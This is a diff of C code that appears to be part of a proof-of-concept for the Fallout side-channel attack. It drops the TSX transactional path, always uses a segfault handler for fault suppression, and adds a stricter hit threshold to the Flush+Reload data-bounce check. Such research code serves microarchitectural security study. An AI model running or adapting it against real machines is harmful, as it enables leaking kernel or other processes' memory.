@@ -122,7 +122,6 @@ static inline uint64_t __attribute__((always_inline)) measure_access_time(void *
     return end - start;
 }
 
-#ifndef TSX_AVAILABLE
 
 static void unblock_signal(int signum __attribute__((__unused__))) {
     sigset_t sigs;
@@ -137,7 +136,6 @@ static void segfault_handler(int signum) {
     longjmp(buf, 1);
 }
 
-#endif
 
 static inline int get_min(uint64_t *buffer, int len) {
     int min_i = 0, i = 0;
@@ -160,18 +158,10 @@ static inline int get_min(uint64_t *buffer, int len) {
  */
 static inline int _data_bounce(void *mem, void *ptr, char success) {
     int i, min_i;
-#ifdef TSX_AVAILABLE
-    flush_mem(mem);
-    if (xbegin()) {
-        data_bounce_asm(ptr, mem, success);
-        xend();
-    }
-#else
     if (!setjmp(buf)) {
         flush_mem(mem);
         data_bounce_asm(ptr, mem, success);
     }
-#endif
     for (i = 0; i < 256; i++) {
         wtf_times[i] = measure_flush_reload(mem + (i << 12));
     }
@@ -201,7 +191,7 @@ int data_bounce(void *mem, void *ptr, int repeats) {
             max_i = result;
         }
     }
-    return max_i == magic_number;
+    return max_i == magic_number && counts[magic_number] > repeats / 6;
 }
 
 int flush_cache(void *mem) {
@@ -324,12 +314,10 @@ int kernel_wtf(void *mem, int procfile) {
  * Init function, should be called before any other function from this file is used
  */
 int fallout_init() {
-#ifndef TSX_AVAILABLE
     if (signal(SIGSEGV, segfault_handler) == SIG_ERR) {
         printf("%s", "Failed to setup signal handler\n");
         return 0;
     }
-#endif
     page_size = getpagesize();
     wtf_times = malloc(sizeof(uint64_t) * 256);
     return 1;
